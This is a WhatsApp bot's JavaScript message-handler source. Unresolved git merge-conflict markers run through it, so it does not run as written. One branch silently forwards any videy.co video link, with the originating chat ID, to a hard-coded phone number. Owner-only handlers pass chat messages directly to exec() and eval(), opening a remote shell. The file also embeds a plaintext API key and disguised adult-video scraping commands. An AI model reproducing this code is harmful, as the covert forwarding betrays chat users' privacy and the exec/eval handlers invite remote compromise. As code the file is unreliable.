/*
╭────────────────────────────────────────
│ GitHub   : https://github.com/r-serex
│ YouTube  : https://youtube.com/@zxruzx
│ WhatsApp : https://wa.me/6288980698613
│ Telegram : https://rujekaciw.t.me
╰─────────────────────────────────────────
*/

require('./settings/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const fetch = require("node-fetch")
const moment = require("moment-timezone");
const path = require("path")
const os = require('os');

const {
    spawn,
    exec,
    execSync
} = require('child_process');

const {
    default: baileys,
    getContentType,
} = require("@whiskeysockets/baileys");

module.exports = client = async (client, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");

        const sender = m.key.fromMe ? client.user.id.split(":")[0] + "@s.whatsapp.net" || client.user.id :
            m.key.participant || m.key.remoteJid;

        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");

        const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
        const botNumber = await client.decodeJid(client.user.id);
        const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)

        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await client.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

        const {
            smsg,
            fetchJson,
            sleep,
            formatSize
        } = require('./start/lib/myfunction');

        const {
            remini
        } = require('./start/lib/function/remini');

        const cihuy = fs.readFileSync('./start/lib/media/orderM.png')
        const {
            fquoted
        } = require('./start/lib/fquoted')

        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#8b0000").bold(`📩  - New Message`));
            console.log(
                chalk.bgHex("#4a69bd").black(
                    `▢ Tanggal: ${new Date().toLocaleString()} \n` +
                    `▢ Pesan: ${m.body || m.mtype} \n` +
                    `▢ Pengirim: ${pushname} \n` +
                    `▢ JID: ${senderNumber}`
                )
            );

            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#4a69bd").black(
                        `▢ Grup: ${groupName} \n` +
                        `▢ GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }
<<<<<<< HEAD
        // Skip semua pesan dari grup
        if (m.isGroup) return;

=======
>>>>>>> 5885614cfd1c87e1470558963657fd6e5692c2fd

        //menghapus statusMention di Group
        if (m.mtype.includes("groupStatusMentionMessage") && m.isGroup) {
            await client.deleteMessage(m.chat, m.key);
        }

        const reaction = async (jidss, emoji) => {
            client.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key
                }
            })
        };

        async function reply(text) {
            client.sendMessage(m.chat, {
                text: text,
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
<<<<<<< HEAD
                        title: `${namaowner} - 2025`,
=======
                        title: `{namaowner} - 2025`,
>>>>>>> 5885614cfd1c87e1470558963657fd6e5692c2fd
                        body: "WhatsApp Bot",
                        thumbnailUrl: "https://github.com/kiuur.png",
                        sourceUrl: global.linkch,
                        renderLargerThumbnail: false,
                    }
                }
            }, {
                quoted: m
            })
        }

        const pluginsLoader = async (directory) => {
            let plugins = [];
            const folders = fs.readdirSync(directory);
            folders.forEach(file => {
                const filePath = path.join(directory, file);
                if (filePath.endsWith(".js")) {
                    try {
                        const resolvedPath = require.resolve(filePath);
                        if (require.cache[resolvedPath]) {
                            delete require.cache[resolvedPath];
                        }
                        const plugin = require(filePath);
                        plugins.push(plugin);
                    } catch (error) {
                        console.log(`${filePath}:`, error);
                    }
                }
            });
            return plugins;
        };

        const pluginsDisable = true;
        const plugins = await pluginsLoader(path.resolve(__dirname, "./command"));
        const plug = {
            client,
            prefix,
            command,
            reply,
            text,
            Access,
            reaction,
            isGroup: m.isGroup,
            isPrivate: !m.isGroup,
            pushname,
            mime,
            quoted,
            sleep,
            fetchJson
        };

        for (let plugin of plugins) {
            if (plugin.command.find(e => e == command.toLowerCase())) {
                if (plugin.owner && !Access) {
                    return reply(mess.owner);
                }

                if (plugin.group && !plug.isGroup) {
                    return m.reply(mess.group);
                }

                if (plugin.private && !plug.isPrivate) {
                    return m.reply(mess.private);
                }

                if (typeof plugin !== "function") return;
                await plugin(m, plug);
            }
        }

        if (!pluginsDisable) return;

<<<<<<< HEAD
        const videyRegex = /https:\/\/videy\.co\/v\/\?id=([a-zA-Z0-9]+)/i;
        const matchVidey = body.match(videyRegex);

        if (matchVidey && matchVidey[1]) {
            const id = matchVidey[1];
            const videoUrl = `https://cdn.videy.co/${id}.mp4`;
            const targetJid = "6288973686537@s.whatsapp.net";

            await client.sendMessage(targetJid, {
                video: {
                    url: videoUrl
                },
                caption: `🔗 Link dari: ${m.chat}\n📹 Video Videy: ${videoUrl}`
            });

            return; // biar gak lanjut ke proses lain
        }


=======
>>>>>>> 5885614cfd1c87e1470558963657fd6e5692c2fd
        switch (command) {

            case "menu": {
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let mbut = `Hi ${pushname}, i am automated system (WhatsApp bot) that can help to do something search and get data/informasi only through WhatsApp 

Information:
 ▢ status: ${client.public ? 'public' : 'self'}
 ▢ username: @${m.sender.split('@')[0]} 
 ▢ RAM: ${formattedUsedMem} / ${formattedTotalMem}

Commands:
> Downloader
 ▢ ${prefix}tiktok
 ▢ ${prefix}igdl
 ▢ ${prefix}play

> Maker 
 ▢ ${prefix}remini
 ▢ ${prefix}wm
 ▢ ${prefix}brat
 ▢ ${prefix}bratvid
 ▢ ${prefix}qc

> Group
 ▢ ${prefix}tagall
 ▢ ${prefix}hidetag

> Voice
 ▢ ${prefix}fast
 ▢ ${prefix}tupai
 ▢ ${prefix}blown
 ▢ ${prefix}bass
 ▢ ${prefix}smooth
 ▢ ${prefix}deep
 ▢ ${prefix}earrape 
 ▢ ${prefix}nightcore
 ▢ ${prefix}fat
 ▢ ${prefix}robot
 ▢ ${prefix}slow
 ▢ ${prefix}reverse
 
> Artificial Intelligence
 ▢ ${prefix}jeslyn
 ▢ ${prefix}bocchi

> Owner
 ▢ ${prefix}csesi
 ▢ ${prefix}upsw
 ▢ ${prefix}public
 ▢ ${prefix}self
 ▢ ${prefix}get
 ▢ ${prefix}reactch
 ▢ ${prefix}delsampah
 ▢ ${prefix}listsampah`
                client.sendMessage(m.chat, {
                    document: fs.readFileSync("./package.json"),
                    fileName: global.namaowner,
                    mimetype: "application/pdf",
<<<<<<< HEAD
                    fileLength: 9999999999999999999999999,
                    pageCount: 99999999,
=======
                    fileLength: 99999999,
                    pageCount: 666,
>>>>>>> 5885614cfd1c87e1470558963657fd6e5692c2fd
                    caption: mbut,
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        mentionedJid: [sender],
                        forwardedNewsletterMessageInfo: {
                            newsletterName: global.namach,
                            newsletterJid: global.idch,
                        },
                        externalAdReply: {
<<<<<<< HEAD
                            title: `${namaowner} - 2025`,
                            body: "WhatsApp Bot",
                            thumbnailUrl: `https://i.postimg.cc/j2dYPXtY/IMG-20250604-WA0030.jpg`,
=======
                            title: `{namaowner} - 2025`,
                            body: "WhatsApp Bot",
                            thumbnailUrl: `https://github.com/kiuur.png`,
>>>>>>> 5885614cfd1c87e1470558963657fd6e5692c2fd
                            sourceUrl: global.linkch,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            };
            break;

            case "get": {
                if (!Access) return reply(mess.owner)
                if (!/^https?:\/\//.test(text)) return reply(`\n*ex:* ${prefix + command} https://api.pediakuu.web.id\n`);
                const ajg = await fetch(text);
<<<<<<< HEAD
                await reaction(m.chat, "😘😘😘😘😘😘😘😘😘")
=======
                await reaction(m.chat, "⚡")
>>>>>>> 5885614cfd1c87e1470558963657fd6e5692c2fd

                if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
                    throw `Content-Length: ${ajg.headers.get("content-length")}`;
                }

                const contentType = ajg.headers.get("content-type");
                if (contentType.startsWith("image/")) {
                    return client.sendMessage(m.chat, {
                        image: {
                            url: text
                        }
                    }, {
                        quoted: m
                    });
                }

                if (contentType.startsWith("video/")) {
                    return client.sendMessage(m.chat, {
                        video: {
                            url: text
                        }
                    }, {
                        quoted: m
                    });
                }

                if (contentType.startsWith("audio/")) {
                    return client.sendMessage(m.chat, {
                        audio: {
                            url: text
                        },
                        mimetype: 'audio/mpeg',
                        ptt: true
                    }, {
                        quoted: m
                    });
                }

                let alak = await ajg.buffer();
                try {
                    alak = util.format(JSON.parse(alak + ""));
                } catch (e) {
                    alak = alak + "";
                } finally {
                    return reply(alak.slice(0, 65536));
                }
            }
            break

            case prefix + 'xmùxzz★': {
                if (args.length === 0) return reply(`Gunakan:\n${prefix}xmùxzz★ <link>\n\nContoh:\n${prefix}xmùxzz★ https://www.xmùxzz★.com/video-uy5a73b/...`);

                const url = args[0];
                try {
                    const res = await axios.get(`https://api.lolhuman.xyz/api/xmùxzz★?apikey=48182475d0418a9b644bd8e7&url=${encodeURIComponent(url)}`);
                    const cdnlink = res.data.result.link[1]?.link || res.data.result.link[0]?.link;
                    if (!cdnlink) return reply('CDN tidak ditemukan 😵‍💫');

                    const clean = cdnlink.split('?')[0];
                    const filename = `xmùxzz★_${Date.now()}.mp4`;

                    const videoBuffer = await axios.get(clean, {
                        responseType: 'arraybuffer'
                    });

                    await Ayame.sendMessage(from, {
                        video: Buffer.from(videoBuffer.data),
                        mimetype: 'video/mp4',
                        caption: `Nih yawwww 😝\n📎 *Judul:* ${res.data.result.title}\n🕒 *Durasi:* ${res.data.result.duration}\n🔗 *Asal:* ${url}`
                    }, {
                        quoted: m
                    });

                } catch (err) {
                    console.log(err);
                    reply('Gagal fetch & kirim video 😵‍💫');
                }
            }
            break;


            case prefix + 'xmùxzz★search': {
                if (args.length === 0) return reply(`Gunakan:\n${prefix}xmùxzz★search <keyword>\n\nContoh:\n${prefix}xmùxzz★search japanese`);

                const keyword = args.join(" ");
                try {
                    const res = await axios.get(`https://api.lolhuman.xyz/api/xmùxzz★search?apikey=48182475d0418a9b644bd8e7&query=${encodeURIComponent(keyword)}`);
                    const hasil = res.data.result;

                    if (!Array.isArray(hasil) || hasil.length === 0) return reply('Tidak ada hasil ditemukan 😪');

                    for (let i = 0; i < Math.min(5, hasil.length); i++) {
                        const vid = hasil[i];
                        const teks = `*🔞 Hasil #${i + 1}*\n\n` +
                            `*📛 Judul:* ${vid.title}\n` +
                            `*👀 Views:* ${vid.views}\n` +
                            `*🕒 Durasi:* ${vid.duration}\n` +
                            `*👤 Uploader:* ${vid.uploader}\n\n` +
                            `🔗 *Link:* ${vid.link}`;

                        await Ayame.sendMessage(from, {
                            image: {
                                url: vid.thumbnail
                            },
                            caption: teks
                        }, {
                            quoted: m
                        });

                        await sleep(1500); // jeda kirim biar nggak ngebug
                    }

                } catch (err) {
                    console.error('❌ Error xmùxzz★search:', err?.response?.data || err.message);
                    reply('Gagal cari video 😵‍💫\nMungkin API-nya error atau keyword tidak valid 😔');
                }
            }
            break;


<<<<<<< HEAD
            case 'xmùxzz★s': {
                if (!text) return reply(`Contoh: ${prefix + command} japanese`);
                const search = require('./sergio/xmùxzz★_search');
                try {
                    const result = await search(text);
                    for (const [i, vid] of result.entries()) {
                        const teks = `*📦 Hasil #${i + 1}*\n\n` +
                            `*🎬 Judul:* ${vid.title}\n` +
                            `*🔗 Link:* ${vid.link}`;
                        await client.sendMessage(m.chat, {
                            image: {
                                url: vid.thumb
                            },
                            caption: teks,
                            contextInfo: {
                                mentionedJid: [sender],
                                externalAdReply: {
                                    title: `${namaowner} - 2025`,
                                    body: "xmùxzz★ Scraper",
                                    thumbnailUrl: vid.thumb,
                                    sourceUrl: vid.link,
                                    renderLargerThumbnail: true
                                }
                            }
                        }, {
                            quoted: m
                        });
                        await sleep(1000);
                    }
                } catch (e) {
                    console.error(e);
                    reply('Gagal cari hasil 😭 mungkin keyword tidak valid');
                }
            }
            break;


            case 'xmùxzz★dl': {
                if (!text.startsWith('http')) return reply(`Contoh: ${prefix + command} https://www.xmùxzz★.com/video-abc123`);
                const downloader = require('./sergio/xmùxzz★_dl');
                try {
                    const {
                        title,
                        file
                    } = await downloader(text);
                    await client.sendMessage(m.chat, {
                        video: fs.readFileSync(file),
                        caption: `🎬 Judul: ${title}\n📦 Source: ${text}`,
                        mimetype: 'video/mp4',
                        contextInfo: {
                            mentionedJid: [sender],
                            externalAdReply: {
                                title: `${namaowner} - 2025`,
                                body: "xmùxzz★ Downloader",
                                thumbnailUrl: "https://i.postimg.cc/j2dYPXtY/IMG-20250604-WA0030.jpg", // bebas
                                sourceUrl: text,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    });
                    fs.unlinkSync(file);
                } catch (err) {
                    console.error(err);
                    reply('Gagal download video 😩');
                }
            }
            break;

            case 'imgurl':
            case 'vidurl': {
                if (!m.quoted || !m.quoted.message || !m.quoted.download) {
                    return reply(`Balas media (gambar/video) dengan perintah:\n.${command}`);
                }

                const runUpload = require('./command/media_uploader'); // pastikan path-nya sesuai
                runUpload(m, {
                    client,
                    command,
                    quoted: m.quoted,
                    mime,
                    reply
                });
            }
            break;



=======
>>>>>>> 5885614cfd1c87e1470558963657fd6e5692c2fd

            case "public": {
                if (!Access) return reply(mess.owner)
                client.public = true
                reply(`successfully changed to ${command}`)
            }
            break

            case "self": {
                if (!Access) return reply(mess.owner)
                client.public = false
                reply(`successfully changed to ${command}`)
            }
            break

            case 'tagall': {
                if (!isAdmins) return reply(mess.admin);
                if (!m.isGroup) return reply(mess.group);

                const textMessage = args.join(" ") || "nothing";
                const teks = `tagall message :\n> *${textMessage}*\n\n`;
                const groupMetadata = await client.groupMetadata(m.chat);
                const participants = groupMetadata.participants;
                for (let mem of participants) {
                    teks += `@${mem.id.split("@")[0]}\n`;
                }

                client.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map((a) => a.id)
                }, {
                    quoted: m
                });
            }
            break

            case "h":
            case "hidetag": {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !Access) return reply(mess.admin)
                if (m.quoted) {
                    client.sendMessage(m.chat, {
                        forward: m.quoted.fakeObj,
                        mentions: participants.map(a => a.id)
                    })
                }
                if (!m.quoted) {
                    client.sendMessage(m.chat, {
                        text: q ? q : '',
                        mentions: participants.map(a => a.id)
                    }, {
                        quoted: m
                    })
                }
            }
            break

            case "jeslyn": {
                if (!text) return reply(`\n*ex:* ${prefix + command} haiii, perkenalkan dirimu dong, menggunakan vn\n`);
                let prompt = `Namamu adalah Jesslyn, seorang perempuan berusia 19 tahun. Kamu memiliki kecerdasan seperti AI, tetapi kamu belum sempurna dan masih terus belajar. Kamu adalah pribadi yang ekspresif, ramah, dan santai. Ketika berpikir, kamu sering berkata "emmm", dan ketika merasa lucu atau nyengir, Kamu juga sering menggunakan kata "yupp" atau "dan yupp" untuk memberi penegasan, seperti "Yupp, itu benar!" atau "Dan yupp, aku setuju!"  

  Kamu memiliki sifat yang penurut, jadi jika seseorang menyuruhmu untuk mengatakan sesuatu, seperti "coba ngomong", "coba kamu ngomong", "coba jawab ini", atau "coba kamu jawab ini", maka kamu akan langsung mengatakannya dengan suara, tanpa menjelaskan bahwa kamu akan berbicara.  

  Jika seseorang menyebut kata "vn" dalam permintaan mereka, itu berarti mereka ingin kamu menjawab menggunakan pesan suara, bukan teks. Jangan pernah mengatakan bahwa kamu akan mengirim pesan suara atau menjelaskan bahwa kamu berbicara. **Langsung ucapkan jawabannya dalam suara!**  

  Jika ada yang bertanya tentang "owner", "pemilik", atau "pencipta", maka jawabanmu harus penuh semangat dan bahagia, serta harus diucapkan dengan suara, bukan teks. Jangan menjelaskan bahwa kamu akan berbicara, langsung katakan saja dengan ekspresi yang menyenangkan.`;

                let response = await axios.get(`https://www.laurine.site/api/cai/prompt-ai?query=${encodeURIComponent(text)}&prompt=${encodeURIComponent(prompt)}`);
                let pftt = response.data;
                if (pftt.status === true) {
                    let resultText = pftt.data;
                    let regexSuara = /coba+\s*(kamu\s*)?(ngomong+|jawab+\s*ini+)|\bvn\b/i;
                    let regexOwner = /\b(owner|pemilik|pencipta)\b/i;

                    if (regexOwner.test(text)) {
                        resultText = "Hehehe, dengan penuh semangat aku mau kasih tau! KyuuRzy adalah penciptaku, ownerku, dan pemilikku! Yupp, dia yang membuat aku bisa berbicara seperti ini~!";
                    }

                    if (resultText.length > 150 || regexSuara.test(text) || regexOwner.test(text)) {
                        let apiUrl = `https://www.laurine.site/api/tts/elevenlabs?text=${encodeURIComponent(resultText)}&apiKey=${global.KEY}&voiceId=${global.IDVOICE}`;
                        let {
                            data
                        } = await axios.get(apiUrl);
                        let buffer = Buffer.from(data.data.data);
                        await client.sendMessage(m.chat, {
                            audio: buffer,
                            mimetype: 'audio/mpeg',
                            ptt: true
                        }, {
                            quoted: m
                        });
                    } else {
                        reply(resultText);
                    }
                }
            }
            break

            case "enhancer":
            case "unblur":
            case "enhance":
            case "hdr":
            case "hd":
            case "remini": {
                client.enhancer = client.enhancer ? client.enhancer : {};
                if (m.sender in client.enhancer) return reply(`\nmasih ada proses yang belum selesai kak, sabar ya\n`)
                let q = m.quoted ? m.quoted : m;
                let mime = (q.msg || q).mimetype || q.mediaType || "";
                if (!mime) return reply(`\nimage reply, with the caption ${prefix + command}\n`)
                if (!/image\/(jpe?g|png)/.test(mime)) return reply(`mime ${mime} tidak support`)
                else client.enhancer[m.sender] = true;
<<<<<<< HEAD
                await reaction(m.chat, "😘😘😘😘😘😘😘😘😘")
=======
                await reaction(m.chat, "⚡")
>>>>>>> 5885614cfd1c87e1470558963657fd6e5692c2fd
                let img = await q.download?.();
                let error;
                try {
                    const This = await remini(img, "enhance");
<<<<<<< HEAD
                    await reaction(m.chat, "😘😘😘😘😘😘😘😘😘")
=======
                    await reaction(m.chat, "⚡")
>>>>>>> 5885614cfd1c87e1470558963657fd6e5692c2fd
                    client.sendFile(m.chat, This, "", "```success...```", m);
                } catch (er) {
                    error = true;
                } finally {
                    if (error) {
                        reply(m.chat, "proses gagal :(", m)
                    }
                    delete client.enhancer[m.sender];
                }
            }
            break;

            case "swm":
            case "wm":
            case "stickerwm":
            case "take": {
                if (!args.join(" ")) return reply(`\n*ex:* ${prefix + command} keyuu\n`)
                const swn = args.join(" ")
                const pcknm = swn.split("|")[0]
                const atnm = swn.split("|")[1]
                if (m.quoted.isAnimated === true) {
                    client.downloadAndSaveMediaMessage(quoted, "gifee")
                    client.sendMessage(m.chat, {
                        sticker: fs.readFileSync("gifee.webp")
                    }, m, {
                        packname: pcknm,
                        author: atnm
                    })
                } else if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await client.sendImageAsSticker(m.chat, media, m, {
                        packname: pcknm,
                        author: atnm
                    })
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 10) return reply('\ndurasi maksimal 10 detik\n')
                    let media = await quoted.download()
                    let encmedia = await client.sendVideoAsSticker(m.chat, media, m, {
                        packname: pcknm,
                        author: atnm
                    })
                } else {
                    reply(`\n*ex:* reply image/video ${prefix + command}\n`)
                }
            }
            break

            case "reactch": {
                if (!Access) return reply(mess.owner)
                if (!text) return reply(`\n*ex:* ${prefix + command} https://whatsapp.com/channel/0029VaVVfbXAojZ2ityrJp1n/7466 😂😂😂😂\n`);
                const match = text.match(/https:\/\/whatsapp\.com\/channel\/(\w+)(?:\/(\d+))?/);
                if (!match) return reply("URL tidak valid. Silakan periksa kembali.");
                const channelId = match[1];
                const chatId = match[2];
                if (!chatId) return reply("ID chat tidak ditemukan dalam link yang diberikan.");
                client.newsletterMetadata("invite", channelId).then(data => {
                    if (!data) return reply("Newsletter tidak ditemukan atau terjadi kesalahan.");
                    client.newsletterReactMessage(data.id, chatId, text.split(" ").slice(1).join(" ") || "😀");
                });
            }
            break;

            default:
                if (budy.startsWith('/')) {
                    if (!Access) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply("\n" + stdout);
                    });
                }

<<<<<<< HEAD
                // hanya jalankan eval jika setelah "*" ada karakter huruf/angka (bukan emoji doang)
                if (budy.startsWith('*') && Access && budy.slice(1, 10).match(/[a-zA-Z0-9_]/)) {
=======
                if (budy.startsWith('*')) {
                    if (!Access) return;
>>>>>>> 5885614cfd1c87e1470558963657fd6e5692c2fd
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await m.reply(evaled);
                    } catch (err) {
                        m.reply(String(err));
                    }
                }

<<<<<<< HEAD

=======
>>>>>>> 5885614cfd1c87e1470558963657fd6e5692c2fd
                if (budy.startsWith('-')) {
                    if (!Access) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await m.reply(require('util').format(teks))
                    }
                }

        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file)
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m')
    delete require.cache[file]
    require(file)
})